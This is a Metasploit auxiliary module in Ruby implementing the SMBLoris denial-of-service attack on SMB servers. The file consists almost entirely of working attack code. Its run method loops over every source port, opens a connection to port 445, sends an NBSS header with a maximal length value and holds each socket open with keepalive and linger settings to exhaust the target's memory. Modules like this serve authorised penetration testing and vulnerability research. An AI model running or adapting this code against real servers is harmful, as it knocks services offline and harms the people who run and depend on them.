##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'bindata'
require 'ruby_smb'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  class NbssHeader < BinData::Record
    endian  :little
    uint8   :message_type
    bit7    :flags
    bit17   :message_length
  end

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SMBLoris NBSS Denial of Service',
      'Description'    => %q{
        The SMBLoris attack consumes large chunks of memory in the target by sending
        SMB requests with the NetBios Session Service(NBSS) Length Header value set
        to the maximum possible value. By keeping these connections open and initiating
        large numbers of these sessions, the memory does not get freed, and the server
        grinds to a halt. This vulnerability was originally disclosed by Sean Dillon
        and Zach Harding.
      },
      'Author'          =>
        [
          'thelightcosine'
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ 'URL', 'http://smbloris.com/' ]
        ],
      'DisclosureDate' => 'Jul 29 2017'
    ))

    register_options(
      [
        Opt::RPORT(445)
      ])
  end

  def run
    header = NbssHeader.new
    header.message_length = 0x01FFFF

    linger = Socket::Option.linger(true, 60)

    (1..65535).each do |src_port|
      print_status "Sending packet from Source Port: #{src_port}"
      opts = {
        'CPORT'           => src_port,
        'ConnectTimeout'  => 360
      }

      begin
        nsock = connect(false, opts)
        nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_KEEPALIVE, true)
        nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPCNT, 5))
        nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPINTVL, 10))
        nsock.setsockopt(linger)
        nsock.write(header.to_binary_s)
      rescue ::Exception => e
        print_error "Exception sending packet: #{e.message}"
      end
    end
    print_status "Sleeping for 30 seconds..."
    select(nil, nil, nil, 30)

  end

end
